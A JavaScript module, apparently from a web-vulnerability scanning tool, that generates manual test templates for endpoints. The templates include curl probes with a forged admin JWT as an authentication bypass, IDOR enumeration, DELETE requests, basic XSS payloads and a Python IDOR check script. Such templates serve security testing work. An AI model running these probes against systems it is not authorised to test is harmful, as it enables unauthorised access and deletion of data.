// scanners/proofOfConcept.js
export class ProofOfConcept {
  
  async generateAPITest(endpoint) {
    return {
      manualTest: `
# Test this endpoint manually:

# 1. Basic access test
curl -X GET "${endpoint}" -v

# 2. Test with authentication bypass
curl -X GET "${endpoint}" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ"

# 3. Test for IDOR
curl -X GET "${endpoint}/1"
curl -X GET "${endpoint}/2"
curl -X GET "${endpoint}/admin"

# 4. Test different HTTP methods
curl -X POST "${endpoint}" -d "test=1"
curl -X PUT "${endpoint}" -d "test=1"
curl -X DELETE "${endpoint}/1"
      `,
      burpSuite: `
1. Send request to Burp Suite
2. Test for parameter injection
3. Check response differences
4. Use Intruder for fuzzing
      `,
      tools: [
        "Burp Suite - Send to Repeater",
        "curl for command line testing",
        "Postman for API exploration"
      ]
    };
  }
  
  generateXSSTest(url, param) {
    return {
      payloads: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
      ],
      testSteps: `
1. Inject payload in ${param} parameter
2. Check if code executes
3. Look for reflection in response
4. Test both GET and POST methods
      `,
      verification: `
# Check if payload reflected:
curl "${url}?${param}=<script>alert(1)</script>" | grep -i "script"

# If reflected, manually verify in browser
      `
    };
  }
  
  generateIDORTest(baseUrl, resourceType) {
    return {
      methodology: `
1. Login as user A
2. Access ${baseUrl}/${resourceType}/1
3. Login as user B
4. Access same ${baseUrl}/${resourceType}/1
5. If you see user A's data → IDOR confirmed
      `,
      automation: `
# Python test script
import requests

def test_idor(base_url, resource, user1_token, user2_token):
    headers1 = {'Authorization': f'Bearer {user1_token}'}
    headers2 = {'Authorization': f'Bearer {user2_token}'}
    
    response1 = requests.get(f"{base_url}/{resource}/1", headers=headers1)
    response2 = requests.get(f"{base_url}/{resource}/1", headers=headers2)
    
    if response1.text == response2.text and response1.status_code == 200:
        print("⚠️ Possible IDOR detected!")
        return True
    return False
      `
    };
  }
}